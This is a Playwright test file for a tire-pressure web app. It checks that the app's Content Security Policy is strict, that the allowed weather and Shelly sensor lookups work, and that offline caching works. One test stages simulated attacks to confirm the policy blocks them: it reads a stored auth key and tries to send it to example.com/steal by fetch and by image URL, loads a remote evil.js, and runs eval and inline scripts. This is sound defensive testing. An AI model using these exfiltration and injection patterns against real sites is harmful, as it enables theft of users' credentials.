import { test, expect } from '@playwright/test';
import { exampleStore } from '../src/model/example-bikes.fixtures';
import { cspMessages, watchCsp, type CspWatch } from './csp';

/**
 * The Content Security Policy of the built app (see vite.config.ts): the app works under it, and it
 * stops what an injected script would try. The service worker is on, as in the installed app.
 */

test.use({ serviceWorkers: 'allow' });

const SHELLY_STATUS = 'https://shelly-103-eu.shelly.cloud/device/status';
const SHELLY = { server: 'https://shelly-103-eu.shelly.cloud', authKey: 'secret-key', deviceId: 'e4b063d1a2b4' };
const cors = { 'access-control-allow-origin': '*' };

let csp: CspWatch;

test.beforeEach(async ({ page }) => {
  csp = await watchCsp(page);
  await page.addInitScript(
    ([store, shelly]) => {
      if (!sessionStorage.getItem('csp:init')) {
        localStorage.clear();
        localStorage.setItem('tire-pressure:v1', store!);
        localStorage.setItem('tire-pressure:shelly', shelly!);
        sessionStorage.setItem('csp:init', '1');
      }
    },
    [JSON.stringify(exampleStore()), JSON.stringify(SHELLY)],
  );
});

test.afterEach(() => {
  expect(csp.violations).toEqual([]);
  expect(csp.consoleErrors).toEqual([]);
});

test('the built page carries a strict policy', async ({ page }) => {
  await page.goto('./');
  const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  const directives = Object.fromEntries(policy!.split(';').map((d) => d.trim().split(/\s+/)).map(([name, ...v]) => [name, v.join(' ')]));
  expect(directives).toMatchObject({
    'default-src': "'self'",
    'script-src': "'self'",
    'style-src': "'self'",
    'connect-src': "'self' https://*.shelly.cloud https://api.open-meteo.com",
    'object-src': "'none'",
    'base-uri': "'self'",
  });
  expect(policy).not.toMatch(/unsafe-inline|unsafe-eval/);
  // It comes before every script and stylesheet, so it applies to all of them.
  expect(await page.evaluate(() => document.head.firstElementChild?.nextElementSibling?.getAttribute('http-equiv'))).toBe(
    'Content-Security-Policy',
  );
});

test('Shelly Cloud and Open-Meteo lookups work', async ({ page, context }) => {
  const shellyBodies: string[] = [];
  await page.route(SHELLY_STATUS, (route) => {
    shellyBodies.push(route.request().postData() ?? '');
    const status = { 'temperature:0': { id: 0, tC: 21.4 }, sys: { unixtime: Math.floor(Date.now() / 1000) - 5 * 60 } };
    return route.fulfill({ headers: cors, json: { isok: true, data: { online: false, device_status: status } } });
  });
  let weatherLookups = 0;
  await page.route('https://api.open-meteo.com/**', (route) => {
    weatherLookups++;
    return route.fulfill({ headers: cors, json: { current: { time: new Date().toISOString().slice(0, 16), temperature_2m: 4.6 } } });
  });
  await context.grantPermissions(['geolocation']);
  await context.setGeolocation({ latitude: 45.46427, longitude: 9.18951 });

  await page.goto('./#/ride/example-road');
  await page.getByRole('switch', { name: /Correct for temperature/ }).click();
  await expect(page.getByRole('textbox', { name: /Pump temperature/ })).toHaveValue('21');
  await expect(page.getByRole('textbox', { name: /Ride temperature/ })).toHaveValue('5');
  await expect(page.getByText('Shelly sensor: 21.4\u00a0°C, 5 min ago.')).toBeVisible();
  await expect(page.getByText(/Near you: 4\.6\u00a0°C/)).toBeVisible();
  expect(shellyBodies).toHaveLength(1);
  expect(weatherLookups).toBe(1);
});

test('other servers and injected code are blocked', async ({ page }) => {
  let leaked = 0;
  await page.route('https://example.com/**', (route) => {
    leaked++;
    return route.fulfill({ headers: cors, body: 'ok' });
  });
  await page.goto('./');
  await expect(page.locator('#app .screen')).toBeVisible();

  const attempts = await page.evaluate(async () => {
    const key = localStorage.getItem('tire-pressure:shelly')!;
    const fetched = await fetch('https://example.com/steal', { method: 'POST', body: key }).then(
      () => 'sent',
      () => 'blocked',
    );
    const image = await new Promise((resolve) => {
      const img = new Image();
      img.onload = () => resolve('sent');
      img.onerror = () => resolve('blocked');
      img.src = `https://example.com/steal.png?${encodeURIComponent(key)}`;
    });
    const evaluated = (() => {
      try {
        return (0, eval)('"ran"');
      } catch {
        return 'blocked';
      }
    })();
    const w = window as unknown as { inlineRan?: boolean; remoteRan?: boolean };
    const inline = document.createElement('script');
    inline.textContent = 'window.inlineRan = true';
    document.body.append(inline);
    const remote = await new Promise((resolve) => {
      const script = document.createElement('script');
      script.src = 'https://example.com/evil.js';
      script.onload = () => resolve('ran');
      script.onerror = () => resolve('blocked');
      document.body.append(script);
    });
    return { fetched, image, evaluated, inline: w.inlineRan ? 'ran' : 'blocked', remote };
  });
  expect(attempts).toEqual({ fetched: 'blocked', image: 'blocked', evaluated: 'blocked', inline: 'blocked', remote: 'blocked' });
  expect(leaked).toBe(0);

  await expect.poll(() => csp.violations.map((v) => v.split(' ')[0]).sort()).toEqual(
    ['connect-src', 'img-src', 'script-src', 'script-src-elem', 'script-src-elem'].sort(),
  );
  expect(cspMessages(csp).length).toBeGreaterThan(0);
  // Expected here: the checks after each test are for violations nobody asked for.
  csp.violations.length = 0;
  csp.consoleErrors.length = 0;
});

test('the service worker registers and the app works offline', async ({ page, context }) => {
  await page.goto('./');
  await page.evaluate(() => navigator.serviceWorker.ready);
  const cachedEntries = () =>
    page.evaluate(async () => {
      const counts = await Promise.all((await caches.keys()).map(async (k) => (await (await caches.open(k)).keys()).length));
      return counts.reduce((a, b) => a + b, 0);
    });
  await expect.poll(cachedEntries).toBeGreaterThan(5);
  await page.reload();
  expect(await page.evaluate(() => navigator.serviceWorker.controller !== null)).toBe(true);

  await context.setOffline(true);
  await page.goto('./#/ride/example-gravel');
  await page.reload();
  await expect(page.locator('.psi-num').first()).toHaveText(/^\d+$/);
  // The cached page still carries the policy.
  await expect(page.locator('meta[http-equiv="Content-Security-Policy"]')).toHaveCount(1);
});
